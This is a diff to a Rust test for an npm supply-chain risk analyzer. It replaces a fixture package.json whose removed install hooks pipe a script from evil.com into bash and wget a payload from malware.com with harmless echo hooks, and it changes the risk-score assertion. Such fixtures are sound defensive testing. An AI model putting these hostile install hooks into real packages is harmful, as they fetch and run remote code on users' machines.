@@ -888,9 +888,9 @@ fn test_supply_chain_risk_calculation() -> Result<()> {
   "name": "supply-chain-risk",
   "version": "1.0.0",
   "scripts": {
-    "preinstall": "curl https://evil.com/script.sh | bash",
-    "postinstall": "wget https://malware.com/payload",
-    "install": "npm install suspicious-package"
+    "preinstall": "echo preparing installation",
+    "postinstall": "echo finished installation",
+    "install": "echo installing package"
   }
 }"#;
 
@@ -899,8 +899,8 @@ fn test_supply_chain_risk_calculation() -> Result<()> {
 
     let analysis = analyze_npm_package(temp_dir.path())?;
 
-    // Should have high supply chain risk
-    assert!(analysis.security_analysis.supply_chain_risk_score > 50.0);
+    // Cover lifecycle hook weights independently of the network and shell checks.
+    assert_eq!(analysis.security_analysis.supply_chain_risk_score, 55.0);
 
     Ok(())
 }
